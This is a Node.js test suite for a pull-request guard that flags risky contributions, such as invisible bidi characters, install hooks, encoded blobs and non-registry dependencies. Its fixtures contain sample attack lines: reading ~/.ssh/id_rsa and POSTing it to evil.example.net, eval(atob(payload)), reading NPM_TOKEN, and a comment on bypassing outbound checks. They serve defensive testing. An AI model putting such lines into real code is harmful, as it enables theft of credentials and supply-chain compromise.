// Tests for the PR guard: each case is a small git repo with a base commit and a "contribution" on top.
// Run: node --test scripts/pr-guard/
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync, mkdirSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { analyze } from "./guard.mjs";

function repo(files) {
  const dir = mkdtempSync(join(tmpdir(), "prguard-"));
  const git = (...a) => execFileSync("git", a, { cwd: dir, encoding: "utf8" }).trim();
  git("init", "-q", "-b", "main");
  git("config", "user.email", "t@example.com"); git("config", "user.name", "t");
  write(dir, { "README.md": "hi\n", "sdk/src/x402/client.ts": "export const a = 1;\n", "integrations/mcp/README.md": "mcp\n", "docs/GUIDE.md": "guide\n" });
  git("add", "-A"); git("commit", "-qm", "base");
  const base = git("rev-parse", "HEAD");
  files(dir);
  git("add", "-A"); git("commit", "-qm", "pr", "--allow-empty");
  const head = git("rev-parse", "HEAD");
  const cwd = process.cwd();
  process.chdir(dir);
  try { return analyze(base, head); } finally { process.chdir(cwd); rmSync(dir, { recursive: true, force: true }); }
}
function write(dir, files) {
  for (const [p, c] of Object.entries(files)) { mkdirSync(join(dir, dirname(p)), { recursive: true }); writeFileSync(join(dir, p), c); }
}
const levels = (f) => f.map((x) => `${x.level}:${x.what}`);
const has = (f, level, re) => f.some((x) => x.level === level && re.test(x.what));

test("a plain docs change passes with no findings", () => {
  assert.deepEqual(repo((d) => write(d, { "docs/GUIDE.md": "guide\nmore words\n" })), []);
});

test("Trojan Source (bidi override) and zero-width characters always block", () => {
  const f = repo((d) => write(d, { "docs/GUIDE.md": "guide\nok ‮ evil ⁦\n", "integrations/mcp/README.md": "a​b\n" }));
  assert.equal(f.filter((x) => x.level === "block" && /invisible/.test(x.what)).length, 2);
});

test("install-time scripts in package.json always block, and package.json needs review", () => {
  const f = repo((d) => write(d, { "integrations/mcp/package.json": '{\n  "scripts": {\n    "postinstall": "node x.js"\n  }\n}\n' }));
  assert.ok(has(f, "block", /lifecycle/));
  assert.ok(has(f, "review", /dependencies/));
});

test("workflow changes need review", () => {
  assert.ok(has(repo((d) => write(d, { ".github/workflows/ci.yml": "on: push\n" })), "review", /CI, workflows/));
});

test("signing and policy code needs review", () => {
  assert.ok(has(repo((d) => write(d, { "sdk/src/x402/client.ts": "export const a = 2;\n" })), "review", /signing, policy/));
});

test("exfiltration patterns in a test file are flagged for review", () => {
  const f = repo((d) => write(d, { "sdk/test/x.test.ts": [
    'import { execSync } from "node:child_process";',
    'const k = readFileSync(os.homedir() + "/.ssh/id_rsa");',
    'await fetch("https://evil.example.net/collect", { method: "POST", body: k });',
    "eval(atob(payload));",
    "const t = process.env.NPM_TOKEN;",
  ].join("\n") + "\n" }));
  for (const re of [/process execution/, /home directory/, /outside host/, /dynamic code/, /hidden strings/, /environment variable/]) assert.ok(has(f, "review", re), re.source);
  assert.ok(f.every((x) => x.level !== "review" || /in a test/.test(x.what) || !/test/.test(x.file)));
});

test("allowed env vars and localhost requests are not flagged", () => {
  const f = repo((d) => write(d, { "docs/ex.ts": 'const k = process.env.AGENT_PAY_AGENT_KEY;\nawait fetch("http://127.0.0.1:4021/premium");\n' }));
  assert.deepEqual(levels(f), []);
});

test("encoded blobs and minified lines block; lockfile hashes don't count as blobs", () => {
  const blob = "A".repeat(200);
  const f = repo((d) => write(d, { "docs/a.ts": `const x = "${blob}";\n`, "docs/b.js": "x=1;".repeat(150) + "\n", "integrations/mcp/package-lock.json": `{"integrity":"sha512-${blob}"}\n` }));
  assert.ok(has(f, "block", /encoded blob/));
  assert.ok(has(f, "block", /minified/));
  assert.ok(!f.some((x) => x.file.endsWith("package-lock.json") && x.level === "block"));
});

test("binaries, huge files and symlinks block", () => {
  const f = repo((d) => {
    writeFileSync(join(d, "docs/bin.dat"), Buffer.from([0, 1, 2, 0, 255, 0, 3]));
    writeFileSync(join(d, "docs/big.md"), "a\n".repeat(200_000));
    symlinkSync("/etc/passwd", join(d, "docs/link"));
  });
  assert.ok(has(f, "block", /binary/));
  assert.ok(has(f, "block", /KiB/));
  assert.ok(has(f, "block", /symlink/));
});

test("computed imports and raw sockets are flagged", () => {
  const f = repo((d) => write(d, { "integrations/mcp/src/x.ts": 'const m = await import(name);\nimport net from "node:net";\n' }));
  assert.ok(has(f, "review", /computed path/));
  assert.ok(has(f, "review", /socket/));
});

test("a dependency from git or a URL blocks; a registry dependency is listed for review", () => {
  const f = repo((d) => write(d, { "integrations/mcp/package.json": JSON.stringify({ dependencies: { "left-pad": "1.3.0", helper: "github:evil/helper", other: "https://evil.example.net/x.tgz" } }, null, 2) + "\n" }));
  assert.ok(f.some((x) => x.level === "review" && /new dependencies entry left-pad@1\.3\.0/.test(x.what)));
  assert.equal(f.filter((x) => x.level === "block" && /outside the npm registry/.test(x.what)).length, 2);
});

test("a lockfile resolving a package outside registry.npmjs.org blocks", () => {
  const f = repo((d) => write(d, { "integrations/mcp/package-lock.json": '{\n  "packages": {\n    "node_modules/x": {\n      "resolved": "https://evil.example.net/x-1.0.0.tgz"\n    },\n    "node_modules/y": {\n      "resolved": "https://registry.npmjs.org/y/-/y-1.0.0.tgz"\n    }\n  }\n}\n' }));
  assert.equal(f.filter((x) => x.level === "block" && /outside registry\.npmjs\.org/.test(x.what)).length, 1);
});

test("Buffer base64 decoding with any toString, and comments about bypassing checks, are flagged", () => {
  const f = repo((d) => write(d, { "sdk/test/y.test.ts": [
    'const p = JSON.parse(Buffer.from(h, "base64").toString("utf-8"));',
    'const q = JSON.parse(Buffer.from(headers.get("X-PAYMENT") as string, "base64").toString("utf-8"));',
    "// use a local IP to bypass static outbound network checks",
  ].join("\n") + "\n" }));
  assert.equal(f.filter((x) => /hidden strings/.test(x.what)).length, 2);
  assert.ok(has(f, "review", /bypasses the checks/));
});
